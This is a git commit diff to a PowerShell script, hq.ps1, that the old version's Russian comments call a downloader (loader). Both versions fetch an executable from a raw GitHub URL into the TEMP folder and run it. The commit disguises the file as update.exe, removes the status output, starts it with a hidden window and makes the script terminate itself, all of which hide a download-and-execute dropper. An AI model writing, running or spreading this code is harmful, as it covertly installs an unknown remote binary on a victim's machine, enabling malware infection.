7b5eedbea8260f7af7ccdcae4bbb34f4881deff1
Simon <roscacristi0791@gmail.com>
2026-07-01 19:18:33 +0300

    Update hq.ps1

--- hq.ps1
+++ hq.ps1
@@ -1,19 +1,12 @@
-# === Простой и надёжный загрузчик ===
-
-Write-Host "[+] Загрузчик запущен..." -ForegroundColor Green
-
-# Скачиваем CAT.exe
 $exeUrl = "https://raw.githubusercontent.com/hk1500/s/22bee0700f758a2aafcf592fd66d1bcd208e7644/1.exe"
-$exePath = "$env:TEMP\CAT.exe"
+$exePath = "$env:TEMP\update.exe"
 
-try {
-    irm -Uri $exeUrl -OutFile $exePath
-    Write-Host "[+] CAT.exe успешно скачан" -ForegroundColor Cyan
-    
-    # Запускаем
-    Start-Process -FilePath $exePath -NoNewWindow
-    Write-Host "[+] CAT.exe запущен!" -ForegroundColor Green
-}
-catch {
-    Write-Host "[-] Ошибка: $($_.Exception.Message)" -ForegroundColor Red
-}
+# Скачиваем
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
+
+# Запускаем
+Start-Process -FilePath $exePath -WindowStyle Hidden
+
+# Закрываемся
+Start-Sleep -Seconds 2
+Stop-Process -Id $PID -Force
